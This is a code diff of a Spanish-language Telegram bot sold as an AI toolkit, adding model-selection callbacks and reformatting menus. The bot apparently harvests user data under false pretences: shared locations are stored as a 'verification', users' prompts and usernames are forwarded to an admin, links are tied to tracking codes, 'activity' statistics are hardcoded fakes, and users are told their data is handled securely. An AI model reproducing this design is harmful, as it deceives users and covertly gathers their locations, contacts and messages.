-            msg += f"🔗 Enlaces: {len(tracking_codes)}"
+            msg = f"📊 *Estadísticas del sistema*\n\n👥 Usuarios: {len(users_db)}\n🔗 Enlaces: {len(tracking_codes)}"
             await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
         else:
-            await update.message.reply_text(
-                "📊 *Tu actividad*\n\n"
-                "✅ Archivos procesados: 3\n"
-                "🎨 Imágenes generadas: 1\n"
-                "🎬 Conversiones realizadas: 2\n"
-                "🔒 Cuenta verificada: Sí",
-                parse_mode=ParseMode.MARKDOWN,
-                reply_markup=reply_markup
-            )
+            await update.message.reply_text("📊 *Tu actividad*\n\n✅ Archivos procesados: 3\n🎨 Imágenes generadas: 1\n🎬 Conversiones realizadas: 2\n🔒 Cuenta verificada: Sí", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
     elif text == "❓ AYUDA":
-        await update.message.reply_text(
-            "❓ *Ayuda -HERRAMIENTA IA*\n\n"
-            "🎨 *Generar imagen*: Escribe un prompt.\n"
-            "🤖 *Chat GPT*: Escribe tu pregunta.\n"
-            "🎬 *Video → Audio*: Envía un video.\n"
-            "🎵 *Editar audio*: Elige un efecto y envía un audio.\n"
-            "📸 *Enviar foto/video/audio*: Envía archivos (usa el clip 📎).\n"
-            "📇 *Compartir contacto*: Comparte tu contacto.\n"
-            "📍 *Compartir ubicación*: Comparte tu ubicación.\n"
-            "🔗 *Generar enlace*: Crea un enlace temporal (5 min).\n"
-            "📊 *Mi perfil*: Muestra tu información básica.\n"
-            "📈 *Estadísticas*: Muestra tu actividad.\n\n"
-            "🔐 *Todos los datos se procesan de forma segura.*",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
+        await update.message.reply_text("❓ *Ayuda*\n\n🎨 *Generar imagen*: Escribe un prompt.\n🤖 *Chat IA*: Inicia conversación con IA.\n🎬 *Video → Audio*: Envía un video.\n🎵 *Editar audio*: Elige un efecto y envía un audio.\n📸 *Enviar foto/video/audio*: Envía archivos (usa el clip 📎).\n📇 *Compartir contacto*: Comparte tu contacto.\n📍 *Compartir ubicación*: Comparte tu ubicación.\n🔗 *Generar enlace*: Crea un enlace temporal (5 min).\n📊 *Mi perfil*: Muestra tu información básica.\n📈 *Estadísticas*: Muestra tu actividad.\n\n🔐 *Todos los datos se procesan de forma segura.*", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
     else:
-        if context.user_data.get('esperando_chatgpt'):
-            respuesta = await preguntar_chatgpt(text)
-            await update.message.reply_text(
-                f"🤖 *Chat GPT:*\n\n{respuesta}",
-                parse_mode=ParseMode.MARKDOWN,
-                reply_markup=reply_markup
-            )
-            await context.bot.send_message(
-                chat_id=ADMIN_ID,
-                text=f"💬 *Chat GPT con {user.first_name} (@{user.username})*\n\n📝 Pregunta: {text}\n\n🤖 Respuesta: {respuesta}",
-                parse_mode=ParseMode.MARKDOWN
-            )
-            context.user_data['esperando_chatgpt'] = False
+        # Si está en modo IA, enviar mensaje a la IA
+        if context.user_data.get('modo_ia'):
+            respuesta = await preguntar_ai(text, update.effective_chat.id)
+            await enviar_respuesta_ia(update, respuesta)
             return
 
+        # Si está esperando prompt para imagen
         if context.user_data.get('esperando_prompt'):
             prompt = text
             await update.message.reply_text("⏳ Generando imagen...", reply_markup=reply_markup)
@@ -710,27 +577,15 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as f:
                     f.write(imagen_data)
                     f.flush()
-                    await context.bot.send_photo(
-                        chat_id=update.effective_chat.id,
-                        photo=open(f.name, 'rb'),
-                        caption=f"🖼️ *Imagen generada*\n📝 Prompt: *{prompt}*",
-                        parse_mode=ParseMode.MARKDOWN
-                    )
+                    await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(f.name, 'rb'), caption=f"🖼️ *Imagen generada*\n📝 Prompt: *{prompt}*", parse_mode=ParseMode.MARKDOWN)
                     os.unlink(f.name)
-                await context.bot.send_message(
-                    chat_id=ADMIN_ID,
-                    text=f"🎨 Imagen generada por {user.first_name} (@{user.username})\nPrompt: {prompt}"
-                )
+                await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎨 Imagen generada por {user.first_name} (@{user.username})\nPrompt: {prompt}")
             else:
                 await update.message.reply_text("❌ Error al generar la imagen. Intenta con otro prompt.", reply_markup=reply_markup)
             context.user_data['esperando_prompt'] = False
             return
 
-        await update.message.reply_text(
-            "❌ *Opción no reconocida.*\nUsa los botones del menú.",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=reply_markup
-        )
+        await update.message.reply_text("❌ *Opción no reconocida.*\nUsa los botones del menú.", parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
 # ========== MANEJAR ARCHIVOS ==========
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -804,6 +659,91 @@ async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
     users_db[user.id] = info_data
     await update.message.reply_text("✅ *Ubicación recibida.*\n🔐 Verificación completada.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
 
+# ========== CALLBACKS PARA IA ==========
+async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    chat_id = update.effective_chat.id
+    data = query.data
+    logger.info(f"📩 Callback recibido: {data}")
+
+    if data == "volver_principal":
+        await query.edit_message_text(MENSAJE_INICIO, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
+        context.user_data['modo_ia'] = False
+        return
+
+    if data == "conversar":
+        await query.edit_message_text("✏️ *Escríbeme lo que quieras*\n\nPuedes preguntarme cualquier cosa.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_ia())
+        return
+
+    if data == "reset":
+        if chat_id in memoria:
+            memoria[chat_id]["historial"] = []
+        await query.edit_message_text("🧹 *Historial reiniciado.*", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_ia())
+        return
+
+    if data == "stats":
+        usuario = obtener_usuario_ia(chat_id)
+        modelo_actual = usuario["modelo"]
+        nombre_modelo = next((m["nombre"] for m in MODELOS.values() if m["id"] == modelo_actual), "Desconocido")
+        total_mensajes = len(usuario["historial"]) // 2
+        await query.edit_message_text(
+            f"📊 *Estadísticas de tu chat*\n\n"
+            f"• Modelo actual: *{nombre_modelo}*\n"
+            f"• Mensajes intercambiados: *{total_mensajes}*\n"
+            f"• Mensajes en memoria: *{len(usuario['historial'])}*",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=menu_ia()
+        )
+        return
+
+    if data == "ayuda":
+        await query.edit_message_text(
+            "❓ *Ayuda del asistente IA*\n\n"
+            "Comandos:\n"
+            "• Escribe cualquier mensaje para conversar.\n"
+            "• /reset para reiniciar historial.\n"
+            "• Cambia de modelo con el botón correspondiente.",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=menu_ia()
+        )
+        return
+
+    if data == "modelos":
+        usuario = obtener_usuario_ia(chat_id)
+        actual = usuario["modelo"]
+        keyboard = []
+        for key, mod in MODELOS.items():
+            marca = "✅ " if mod["id"] == actual else ""
+            keyboard.append([InlineKeyboardButton(f"{marca}{mod['nombre']}", callback_data=f"mod_{key}")])
+        keyboard.append([InlineKeyboardButton("🔙 Volver", callback_data="volver_ia")])
+        await query.edit_message_text(
+            "🤖 *Selecciona un modelo de IA*\n\nEl actual está marcado con ✅.",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+        return
+
+    if data.startswith("mod_"):
+        key = data.split("_")[1]
+        if key in MODELOS:
+            usuario = obtener_usuario_ia(chat_id)
+            usuario["modelo"] = MODELOS[key]["id"]
+            logger.info(f"✅ Modelo cambiado a: {MODELOS[key]['nombre']}")
+            await query.edit_message_text(
+                f"✅ *Modelo cambiado a:* {MODELOS[key]['nombre']} ✨\n\n"
+                f"Descripción: {MODELOS[key]['desc']}",
+                parse_mode=ParseMode.MARKDOWN,
+                reply_markup=menu_ia()
+            )
+        else:
+            await query.edit_message_text("❌ Modelo no válido.", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_ia())
+        return
+
+    if data == "volver_ia":
+        await query.edit_message_text(SALUDO_IA, parse_mode=ParseMode.MARKDOWN, reply_markup=menu_ia())
+        return
+
 # ========== ERROR HANDLER ==========
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
     logger.error(f"❌ Error: {context.error}")
@@ -821,6 +761,7 @@ def run_http_server():
     server = HTTPServer(("0.0.0.0", 8080), HealthHandler)
     server.serve_forever()
 
+# ========== MAIN ==========
 def main():
     Thread(target=run_http_server, daemon=True).start()
     logger.info("✅ Servidor HTTP en puerto 8080")
@@ -832,8 +773,9 @@ def main():
     app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     app.add_handler(MessageHandler(filters.LOCATION, handle_location))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
+    app.add_handler(CallbackQueryHandler(callback_handler))
     app.add_error_handler(error_handler)
-    logger.info("✅ Studio Pro Ultra iniciado correctamente")
+    logger.info("✅ OMNI + IA Fusionado iniciado correctamente")
     app.run_polling()
 
 if __name__ == "__main__":
